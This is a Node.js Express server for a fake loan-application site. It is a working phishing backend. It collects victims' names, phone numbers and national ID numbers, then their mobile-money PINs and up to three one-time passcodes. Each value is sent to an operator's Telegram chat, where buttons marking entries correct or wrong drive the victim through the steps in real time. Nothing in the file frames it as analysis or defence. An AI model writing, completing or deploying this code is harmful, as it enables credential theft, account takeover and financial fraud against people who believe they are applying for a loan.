const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

const users = {};

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("Missing fields");
  }

  users[phone] = {
    name,
    phone,
    network,
    amount,
    nationalId,
    status: "pending",
    pinStatus: "waiting",
    otpStatus: "waiting",
    otpStep: 1,
    attempts: 0
  };

  const message =
`📥 NEW LOAN APPLICATION
👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ APPROVE", callback_data: `approve_${phone}` },
        { text: "❌ DECLINE", callback_data: `decline_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: keyboard
    });

    res.sendStatus(200);
  } catch (err) {
    console.log("Telegram error:", err.message);
    res.status(500).send("Telegram failed");
  }
});

// ================= STATUS =================
app.get("/status/:phone", (req, res) => {
  const user = users[req.params.phone];
  res.json({ status: user ? user.status : "unknown" });
});

app.get("/check-pin-status/:phone", (req, res) => {
  const user = users[req.params.phone];
  res.json({
    status: user ? user.pinStatus : "unknown",
    attempt: user ? user.attempts : 0
  });
});

app.get("/check-otp-status/:phone", (req, res) => {
  const user = users[req.params.phone];
  res.json({
    status: user ? user.otpStatus : "unknown",
    step: user ? user.otpStep : 1
  });
});

// ================= PIN =================
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;
  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";

  const message =
`🔐 PIN RECEIVED (${users[phone].attempts}/3)
📱 Phone: ${phone}
🔑 PIN: ${pin}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✔ CORRECT", callback_data: `pinok_${phone}` },
        { text: "❌ WRONG", callback_data: `pinwrong_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: keyboard
    });

    res.sendStatus(200);
  } catch (err) {
    console.log("PIN error:", err.message);
    res.sendStatus(500);
  }
});

// ================= OTP =================
app.post("/send-otp", async (req, res) => {
  const { phone, otp, step } = req.body;
  if (!users[phone]) return res.sendStatus(404);

  const stepNum = parseInt(step || users[phone].otpStep);

  users[phone].otpStatus = "verifying";
  users[phone].otpStep = stepNum;

  const message =
`🔢 OTP RECEIVED (Step ${stepNum}/3)
📱 Phone: ${phone}
🔑 OTP: ${otp}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ CORRECT", callback_data: `otpok_${phone}` },
        { text: "❌ WRONG", callback_data: `otpwrong_${phone}` }
      ],
      [
        { text: "⚠️ BACK TO PIN", callback_data: `pinwrong_${phone}` }
      ]
    ]
  };

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: keyboard
    });

    res.sendStatus(200);
  } catch (err) {
    console.log("OTP error:", err.message);
    res.sendStatus(500);
  }
});

// ================= WEBHOOK =================
app.post("/webhook", async (req, res) => {
  const cb = req.body.callback_query;
  if (!cb || !cb.data) return res.sendStatus(200);

  const [command, phone] = cb.data.split("_");
  const user = users[phone];
  if (!user) return res.sendStatus(200);

  let msg = "";

  if (command === "approve") {
    user.status = "approved";
    msg = `APPROVED ${phone}`;
  }

  if (command === "decline") {
    user.status = "declined";
    msg = `DECLINED ${phone}`;
  }

  if (command === "pinok") {
    user.pinStatus = "success";
    msg = `PIN OK ${phone}`;
  }

  if (command === "pinwrong") {
    user.pinStatus = "re-enter";
    user.otpStatus = "back-to-pin";
    msg = `PIN WRONG ${phone}`;
  }

  if (command === "otpok") {
    user.otpStep = Math.min((user.otpStep || 1) + 1, 3);

    if (user.otpStep >= 3) {
      user.otpStatus = "finish";
      msg = `OTP COMPLETE ${phone}`;
    } else {
      user.otpStatus = "next";
      msg = `NEXT OTP ${user.otpStep}/3`;
    }
  }

  if (command === "otpwrong") {
    user.otpStatus = "re-enter";
    msg = `OTP WRONG ${phone}`;
  }

  try {
    await axios.post(`${TG}/sendMessage`, {
      chat_id: CHAT_ID,
      text: msg
    });
  } catch (e) {
    console.log("Webhook TG error:", e.message);
  }

  res.sendStatus(200);
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
